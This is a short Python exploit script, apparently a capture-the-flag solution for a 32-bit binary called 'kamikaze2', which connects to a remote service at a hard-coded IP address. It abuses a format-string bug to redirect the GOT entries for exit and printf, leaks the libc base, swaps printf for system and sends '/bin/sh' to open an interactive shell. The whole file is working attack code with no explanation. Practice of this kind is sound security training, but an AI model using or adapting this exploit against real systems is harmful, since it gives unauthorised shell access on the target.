from ptrlib import *

elf = ELF("./kamikaze2")
libc = ELF("./libc-2.27.so")
#sock = Process("./kamikaze2")
sock = Socket("13.53.125.206", 50000)
addr_start = 0x8420620

# leak libc
payload = b'XX'
payload += fsb(
    pos = 8,
    writes = {elf.got('exit'): addr_start},
    written = 2,
    bs = 2,
    bits = 32
)
payload += b'::%23$p'
sock.sendlineafter("Topic: ", payload)
libc_base = int(sock.recv(4000).split(b'::')[-1][:10], 16) - libc.symbol('__libc_start_main') - 0xf1
logger.info("libc = " + hex(libc_base))

# overwrite printf
payload = b'XX'
payload += fsb(
    pos = 8,
    writes = {elf.got('printf'): libc_base + libc.symbol('system')},
    written = 2,
    bs = 1,
    bits = 32
)
sock.sendline(payload)
sock.recv()

# get the shell!
sock.sendline("/bin/sh\x00")
sock.recv()

sock.interactive()
